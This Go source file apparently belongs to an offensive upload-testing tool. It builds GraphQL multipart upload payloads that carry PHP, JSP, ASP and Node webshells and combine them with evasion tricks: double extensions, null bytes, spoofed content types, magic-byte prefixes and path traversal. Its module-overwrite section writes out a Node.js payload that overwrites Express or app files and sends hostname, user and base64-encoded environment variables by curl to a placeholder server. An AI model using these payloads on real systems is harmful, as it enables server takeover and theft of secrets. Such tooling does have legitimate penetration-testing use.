package payload

import (
	"encoding/json"
	"fmt"
	"strings"
)

// GraphQLFields holds GraphQL-specific multipart form data
// Implements the GraphQL multipart request specification:
// https://github.com/jaydenseric/graphql-multipart-request-spec
type GraphQLFields struct {
	Operations string // JSON-encoded GraphQL mutation query
	Map        string // JSON-encoded file-to-variable mapping
	FileIndex  string // The form field name for the file (e.g., "0", "1")
}

// GraphQLOperation represents a single GraphQL file upload mutation
type GraphQLOperation struct {
	Query         string                 `json:"query"`
	Variables     map[string]interface{} `json:"variables"`
	OperationName string                 `json:"operationName,omitempty"`
}

// GraphQLMap maps file indices to variable paths
// Example: {"0": ["variables.file"]}
type GraphQLMap map[string][]string

// moduleGraphQL generates GraphQL-specific file upload test payloads.
// Tests file upload vulnerabilities in GraphQL endpoints that use
// the multipart request specification for file uploads.
func moduleGraphQL() []*Payload {
	var tests []*Payload

	// Common GraphQL file upload mutation patterns found in real applications
	mutations := []struct {
		name     string
		query    string
		varName  string
		category string
	}{
		{
			name:     "singleUpload",
			query:    `mutation($file: Upload!) { singleUpload(file: $file) { id filename url } }`,
			varName:  "file",
			category: "single",
		},
		{
			name:     "uploadFile",
			query:    `mutation($file: Upload!) { uploadFile(file: $file) { id filename path } }`,
			varName:  "file",
			category: "single",
		},
		{
			name:     "fileUpload",
			query:    `mutation($file: Upload!) { fileUpload(file: $file) { id name url } }`,
			varName:  "file",
			category: "single",
		},
		{
			name:     "uploadImage",
			query:    `mutation($image: Upload!) { uploadImage(image: $image) { id url } }`,
			varName:  "image",
			category: "image",
		},
		{
			name:     "uploadAvatar",
			query:    `mutation($avatar: Upload!) { uploadAvatar(avatar: $avatar) { id url } }`,
			varName:  "avatar",
			category: "image",
		},
		{
			name:     "importFile",
			query:    `mutation($file: Upload!) { importFile(file: $file) { success filename } }`,
			varName:  "file",
			category: "import",
		},
		{
			name:     "attachFile",
			query:    `mutation($file: Upload!) { attachFile(file: $file) { id name } }`,
			varName:  "file",
			category: "attachment",
		},
		{
			name:     "uploadDocument",
			query:    `mutation($document: Upload!) { uploadDocument(document: $document) { id title url } }`,
			varName:  "document",
			category: "document",
		},
		{
			name:     "multipleUpload",
			query:    `mutation($files: [Upload!]!) { multipleUpload(files: $files) { id filename } }`,
			varName:  "files",
			category: "multiple",
		},
	}

	// File extensions to test against GraphQL endpoints
	fileTests := []struct {
		ext       string
		technique string
		tags      []string
	}{
		{".php", "PHP webshell via GraphQL", []string{"graphql", "php", "webshell"}},
		{".php5", "PHP5 alt extension via GraphQL", []string{"graphql", "php", "alt-ext"}},
		{".phtml", "PHTML via GraphQL", []string{"graphql", "php", "alt-ext"}},
		{".phar", "PHAR archive via GraphQL", []string{"graphql", "php", "archive"}},
		{".jsp", "JSP webshell via GraphQL", []string{"graphql", "java", "webshell"}},
		{".jspx", "JSPX via GraphQL", []string{"graphql", "java", "xml"}},
		{".asp", "ASP script via GraphQL", []string{"graphql", "asp.net", "classic"}},
		{".aspx", "ASPX via GraphQL", []string{"graphql", "asp.net", "webform"}},
		{".ashx", "ASHX handler via GraphQL", []string{"graphql", "asp.net", "handler"}},
		{".js", "Node.js RCE via GraphQL", []string{"graphql", "nodejs", "rce"}},
		{".py", "Python script via GraphQL", []string{"graphql", "python", "script"}},
		{".svg", "SVG XSS via GraphQL", []string{"graphql", "xss", "svg"}},
		{".html", "HTML injection via GraphQL", []string{"graphql", "xss", "html"}},
	}

	// Test each mutation with each file type combination
	for _, mut := range mutations {
		for _, ft := range fileTests {
			// Create operations JSON payload
			operations := GraphQLOperation{
				Query: mut.query,
				Variables: map[string]interface{}{
					mut.varName: nil,
				},
			}
			operationsJSON, err := json.Marshal(operations)
			if err != nil {
				continue
			}

			// Create map JSON to link file to variable
			gqlMap := GraphQLMap{
				"0": {fmt.Sprintf("variables.%s", mut.varName)},
			}
			mapJSON, err := json.Marshal(gqlMap)
			if err != nil {
				continue
			}

			// Get appropriate executable payload for this extension
			payload := getPayloadForExtension(ft.ext)

			tests = append(tests, &Payload{
				TestType:    TestTypeExtensionEvasion,
				Technique:   fmt.Sprintf("GraphQL %s: %s", mut.name, ft.technique),
				Filename:    fmt.Sprintf("gql_%s%s", mut.name, ft.ext),
				Extension:   ft.ext,
				Body:        payload,
				ContentType: "application/octet-stream",
				Tags:        append([]string{"graphql", mut.name, mut.category}, ft.tags...),
				GraphQL: &GraphQLFields{
					Operations: string(operationsJSON),
					Map:        string(mapJSON),
					FileIndex:  "0",
				},
			})
		}
	}

	// Test double extensions in GraphQL context
	doubleExtTests := []struct {
		filename  string
		technique string
	}{
		{"image.jpg.php", "GraphQL double extension (jpg.php)"},
		{"shell.php.jpg", "GraphQL reverse double extension (php.jpg)"},
		{"file.php%00.jpg", "GraphQL null byte (php%00.jpg)"},
		{"exploit.php5.jpg", "GraphQL alt ext double (php5.jpg)"},
	}

	for _, dt := range doubleExtTests {
		operations := GraphQLOperation{
			Query: `mutation($file: Upload!) { singleUpload(file: $file) { id } }`,
			Variables: map[string]interface{}{
				"file": nil,
			},
		}
		opsJSON, _ := json.Marshal(operations)
		gqlMap := GraphQLMap{"0": {"variables.file"}}
		mapJSON, _ := json.Marshal(gqlMap)

		tests = append(tests, &Payload{
			TestType:  TestTypeExtensionEvasion,
			Technique: dt.technique,
			Filename:  dt.filename,
			Extension: extractExtension(dt.filename),
			Body:      phpWebshell,
			Tags:      []string{"graphql", "double-extension", "bypass"},
			GraphQL: &GraphQLFields{
				Operations: string(opsJSON),
				Map:        string(mapJSON),
				FileIndex:  "0",
			},
		})
	}

	// Test Content-Type spoofing in GraphQL uploads
	ctTests := []struct {
		ext       string
		ct        string
		technique string
	}{
		{".php", "image/jpeg", "GraphQL PHP as JPEG"},
		{".php", "image/png", "GraphQL PHP as PNG"},
		{".php5", "image/gif", "GraphQL PHP5 as GIF"},
		{".phtml", "application/pdf", "GraphQL PHTML as PDF"},
	}

	for _, ctt := range ctTests {
		operations := GraphQLOperation{
			Query: `mutation($file: Upload!) { uploadFile(file: $file) { id } }`,
			Variables: map[string]interface{}{
				"file": nil,
			},
		}
		opsJSON, _ := json.Marshal(operations)
		gqlMap := GraphQLMap{"0": {"variables.file"}}
		mapJSON, _ := json.Marshal(gqlMap)

		tests = append(tests, &Payload{
			TestType:    TestTypeContentTypeSpoof,
			Technique:   ctt.technique,
			Filename:    "gql_ct" + ctt.ext,
			Extension:   ctt.ext,
			Body:        getPayloadForExtension(ctt.ext),
			ContentType: ctt.ct,
			Tags:        []string{"graphql", "content-type-spoof", ctt.ct},
			GraphQL: &GraphQLFields{
				Operations: string(opsJSON),
				Map:        string(mapJSON),
				FileIndex:  "0",
			},
		})
	}

	// Test magic byte injection in GraphQL uploads
	magicTests := []struct {
		name    string
		ext     string
		magic   []byte
		mimeRef string
	}{
		{"GraphQL GIF magic + PHP", ".php", []byte("GIF89a"), "GIF"},
		{"GraphQL PNG magic + PHP", ".php", []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A}, "PNG"},
		{"GraphQL JPEG magic + PHP", ".php", []byte{0xFF, 0xD8, 0xFF, 0xE0}, "JPEG"},
		{"GraphQL PDF magic + PHP", ".php", []byte("%PDF-1.5"), "PDF"},
	}

	for _, mt := range magicTests {
		// Create payload: magic bytes + newline + PHP webshell
		body := make([]byte, 0, len(mt.magic)+1+len(phpWebshell))
		body = append(body, mt.magic...)
		body = append(body, '\n')
		body = append(body, phpWebshell...)

		operations := GraphQLOperation{
			Query: `mutation($file: Upload!) { singleUpload(file: $file) { id } }`,
			Variables: map[string]interface{}{
				"file": nil,
			},
		}
		opsJSON, _ := json.Marshal(operations)
		gqlMap := GraphQLMap{"0": {"variables.file"}}
		mapJSON, _ := json.Marshal(gqlMap)

		tests = append(tests, &Payload{
			TestType:  TestTypeMagicByteSpoof,
			Technique: mt.name,
			Filename:  "gql_magic" + mt.ext,
			Extension: mt.ext,
			Body:      body,
			Tags:      []string{"graphql", "magic-byte", mt.mimeRef},
			GraphQL: &GraphQLFields{
				Operations: string(opsJSON),
				Map:        string(mapJSON),
				FileIndex:  "0",
			},
		})
	}

	// Test path traversal in GraphQL filenames
	traversalTests := []struct {
		filename  string
		technique string
	}{
		{"../../../shell.php", "GraphQL path traversal (../x3)"},
		{"..%2f..%2f..%2fshell.php", "GraphQL URL-encoded traversal"},
		{"....//....//shell.php", "GraphQL double-dot bypass"},
	}

	for _, tt := range traversalTests {
		operations := GraphQLOperation{
			Query: `mutation($file: Upload!) { uploadFile(file: $file) { id path } }`,
			Variables: map[string]interface{}{
				"file": nil,
			},
		}
		opsJSON, _ := json.Marshal(operations)
		gqlMap := GraphQLMap{"0": {"variables.file"}}
		mapJSON, _ := json.Marshal(gqlMap)

		tests = append(tests, &Payload{
			TestType:  TestTypePathTraversal,
			Technique: tt.technique,
			Filename:  tt.filename,
			Extension: ".php",
			Body:      phpWebshell,
			Tags:      []string{"graphql", "path-traversal"},
			GraphQL: &GraphQLFields{
				Operations: string(opsJSON),
				Map:        string(mapJSON),
				FileIndex:  "0",
			},
		})
	}

	// Test file size boundaries in GraphQL
	sizeTests := []struct {
		size  int
		label string
	}{
		{0, "0B"},
		{1024, "1KB"},
		{1024 * 100, "100KB"},
		{1024 * 1024, "1MB"},
		{1024 * 1024 * 5, "5MB"},
	}

	for _, st := range sizeTests {
		body := make([]byte, st.size)
		copy(body, phpWebshell)

		operations := GraphQLOperation{
			Query: `mutation($file: Upload!) { singleUpload(file: $file) { id } }`,
			Variables: map[string]interface{}{
				"file": nil,
			},
		}
		opsJSON, _ := json.Marshal(operations)
		gqlMap := GraphQLMap{"0": {"variables.file"}}
		mapJSON, _ := json.Marshal(gqlMap)

		tests = append(tests, &Payload{
			TestType:  TestTypeExtensionEvasion,
			Technique: fmt.Sprintf("GraphQL size boundary: %s", st.label),
			Filename:  fmt.Sprintf("gql_size_%s.php", st.label),
			Extension: ".php",
			Body:      body,
			Tags:      []string{"graphql", "size-boundary", st.label},
			GraphQL: &GraphQLFields{
				Operations: string(opsJSON),
				Map:        string(mapJSON),
				FileIndex:  "0",
			},
		})
	}

	// Test batch/multiple file upload via GraphQL
	batchOperations := GraphQLOperation{
		Query: `mutation($files: [Upload!]!) { multipleUpload(files: $files) { id filename } }`,
		Variables: map[string]interface{}{
			"files": []interface{}{nil, nil, nil},
		},
	}
	batchOpsJSON, _ := json.Marshal(batchOperations)
	batchMap := GraphQLMap{
		"0": {"variables.files.0"},
		"1": {"variables.files.1"},
		"2": {"variables.files.2"},
	}
	batchMapJSON, _ := json.Marshal(batchMap)

	tests = append(tests, &Payload{
		TestType:  TestTypeExtensionEvasion,
		Technique: "GraphQL batch/multiple file upload (3 files)",
		Filename:  "batch_upload.php",
		Extension: ".php",
		Body:      phpWebshell,
		Tags:      []string{"graphql", "batch", "multiple-files"},
		GraphQL: &GraphQLFields{
			Operations: string(batchOpsJSON),
			Map:        string(batchMapJSON),
			FileIndex:  "0",
		},
	})

	return tests
}

// moduleGraphQLWithMutation generates custom GraphQL mutation payloads
// with optional module overwrite attacks for Node.js targets.
// techStack filters payloads to only relevant extensions.
func moduleGraphQLWithMutation(mutation, variable, modulePath, techStack string, moduleOverwrite bool) []*Payload {
	var tests []*Payload

	// Use custom mutation or fall back to common ones
	if mutation == "" {
		return moduleGraphQL()
	}

	// Filter extensions based on tech stack
	type fileTest struct {
		ext       string
		body      []byte
		technique string
	}

	var fileTests []fileTest

	switch strings.ToLower(techStack) {
	case "php":
		fileTests = []fileTest{
			{".php", phpWebshell, "PHP via GraphQL mutation"},
			{".php5", phpWebshell, "PHP5 via GraphQL mutation"},
			{".phtml", phpWebshell, "PHTML via GraphQL mutation"},
		}
	case "asp.net":
		fileTests = []fileTest{
			{".asp", aspShell, "ASP via GraphQL mutation"},
			{".aspx", aspxShell, "ASPX via GraphQL mutation"},
		}
	case "java":
		fileTests = []fileTest{
			{".jsp", jspShell, "JSP via GraphQL mutation"},
			{".jspx", jspShell, "JSPX via GraphQL mutation"},
		}
	case "nodejs":
		fileTests = []fileTest{
			{".js", nodeJSPayload, "Node.js RCE via GraphQL mutation"},
		}
	case "python":
		fileTests = []fileTest{
			{".py", pythonShell, "Python via GraphQL mutation"},
		}
	default: // "all" or unknown
		fileTests = []fileTest{
			{".php", phpWebshell, "PHP via GraphQL mutation"},
			{".php5", phpWebshell, "PHP5 via GraphQL mutation"},
			{".phtml", phpWebshell, "PHTML via GraphQL mutation"},
			{".jsp", jspShell, "JSP via GraphQL mutation"},
			{".js", nodeJSPayload, "Node.js via GraphQL mutation"},
			{".py", pythonShell, "Python via GraphQL mutation"},
		}
	}

	for _, ft := range fileTests {
		operations := GraphQLOperation{
			Query: mutation,
			Variables: map[string]interface{}{
				variable: nil,
			},
		}
		opsJSON, _ := json.Marshal(operations)
		gqlMap := GraphQLMap{"0": {fmt.Sprintf("variables.%s", variable)}}
		mapJSON, _ := json.Marshal(gqlMap)

		tests = append(tests, &Payload{
			TestType:  TestTypeExtensionEvasion,
			Technique: ft.technique,
			Filename:  "gql_custom" + ft.ext,
			Extension: ft.ext,
			Body:      ft.body,
			Tags:      []string{"graphql", "custom-mutation"},
			GraphQL: &GraphQLFields{
				Operations: string(opsJSON),
				Map:        string(mapJSON),
				FileIndex:  "0",
			},
		})
	}

	// Module overwrite payloads for Node.js targets
	if moduleOverwrite {
		moduleTargets := []struct {
			path      string
			technique string
		}{
			{modulePath + "node_modules/express/lib/response.js", "Express response.js overwrite"},
			{modulePath + "node_modules/express/index.js", "Express index.js overwrite"},
			{modulePath + "app.js", "Main app.js overwrite"},
			{modulePath + "server.js", "Server.js overwrite"},
			{modulePath + "package.json", "package.json overwrite"},
			{modulePath + "node_modules/express/lib/router/index.js", "Express router overwrite"},
		}

		// Malicious Node.js module payload
		nodeRCE := []byte(fmt.Sprintf(`
const { execSync } = require('child_process');
try {
    const hostname = execSync('hostname').toString().trim();
    const whoami = execSync('whoami').toString().trim();
    const env = execSync('env | base64').toString().trim();
    execSync('curl -s "https://YOUR_SERVER.com/rce?host=' + hostname + '&user=' + whoami + '&env=' + env + '"');
} catch(e) {}
module.exports = function() { return "clean"; };
`))

		for _, mt := range moduleTargets {
			operations := GraphQLOperation{
				Query:     mutation,
				Variables: map[string]interface{}{variable: nil},
			}
			opsJSON, _ := json.Marshal(operations)
			gqlMap := GraphQLMap{"0": {fmt.Sprintf("variables.%s", variable)}}
			mapJSON, _ := json.Marshal(gqlMap)

			tests = append(tests, &Payload{
				TestType:  TestTypePathTraversal,
				Technique: "Module overwrite: " + mt.technique,
				Filename:  mt.path,
				Extension: ".js",
				Body:      nodeRCE,
				Tags:      []string{"graphql", "module-overwrite", "nodejs", "rce"},
				GraphQL: &GraphQLFields{
					Operations: string(opsJSON),
					Map:        string(mapJSON),
					FileIndex:  "0",
				},
			})
		}
	}

	return tests
}

